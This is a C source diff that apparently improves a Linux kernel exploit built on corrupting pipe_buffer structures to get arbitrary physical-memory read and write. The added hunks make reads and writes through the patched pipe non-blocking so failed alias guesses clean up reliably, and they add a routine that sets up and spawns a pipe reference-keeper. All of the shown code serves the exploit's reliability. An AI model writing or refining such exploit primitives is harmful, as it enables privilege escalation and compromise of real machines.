@@ -546,6 +546,18 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   return 0;
 }
 
+/* Toggle O_NONBLOCK on a pipe end so syscalls executed against a
+ * patched pipe_buffer can never block past our control (see
+ * pipe_phys_read). Best-effort: failure only means we skip the toggle. */
+static int pipe_set_nonblock(int fd_, int nonblock) {
+  int fl = fcntl(fd_, F_GETFL);
+  if (fl < 0) {
+    return 0;
+  }
+  return fcntl(fd_, F_SETFL,
+               nonblock ? (fl | O_NONBLOCK) : (fl & ~O_NONBLOCK)) == 0;
+}
+
 int pipe_phys_read(
     int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
     void *out, size_t len) {
@@ -580,7 +592,20 @@ int pipe_phys_read(
     return 0;
   }
 
+  /* The syscall below executes while the kernel pipe_buffer is patched
+   * to an arbitrary physical page. Make it non-blocking for the window:
+   * if the direct-map alias guess is wrong we must fail this attempt
+   * cleanly and run the restore — a blocking read here would only end at
+   * the supervisor SIGKILL, skipping the restore entirely (leaving the
+   * patched buffer + foreign page reference behind). */
+  int nb_ok = pipe_set_nonblock(pipefd[0], 1);
   ssize_t got = read(pipefd[0], out, len);
+  if (got < 0 && errno == EAGAIN) {
+    pr_error("pipe phys read would block (bad alias?)\n");
+  }
+  if (nb_ok) {
+    pipe_set_nonblock(pipefd[0], 0);
+  }
   int restored_ok =
       kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
           (ssize_t)sizeof(saved) &&
@@ -629,7 +654,16 @@ int pipe_phys_write(
     return 0;
   }
 
+  /* Same patched-window discipline as pipe_phys_read: never allow the
+   * syscall against the patched buffer to block past our control. */
+  int nb_ok = pipe_set_nonblock(pipefd[1], 1);
   ssize_t wrote = write(pipefd[1], data, len);
+  if (wrote < 0 && errno == EAGAIN) {
+    pr_error("pipe phys write would block (bad alias?)\n");
+  }
+  if (nb_ok) {
+    pipe_set_nonblock(pipefd[1], 0);
+  }
   int restored_ok =
       kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
           (ssize_t)sizeof(saved) &&
@@ -1015,6 +1049,22 @@ static void spawn_p0_ref_keeper(int retained_pipe_index) {
     }
     usleep(10000);
   }
+}
+
+void start_p0_ref_keeper(void) {
+  if (p0_gate_holders_initialized) {
+    return;
+  }
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    p0_gate_holders[i][0] = -1;
+    p0_gate_holders[i][1] = -1;
+  }
+  if (pipe2(p0_gate_holders[0], O_CLOEXEC) < 0) {
+    pr_error("p0 ref keeper gate pipe failed errno=%d\n", errno);
+    return;
+  }
+  p0_gate_holders_initialized = 1;
+  spawn_p0_ref_keeper(0);
 }
 
 int prepare_p0_pipe_oracle(void) {
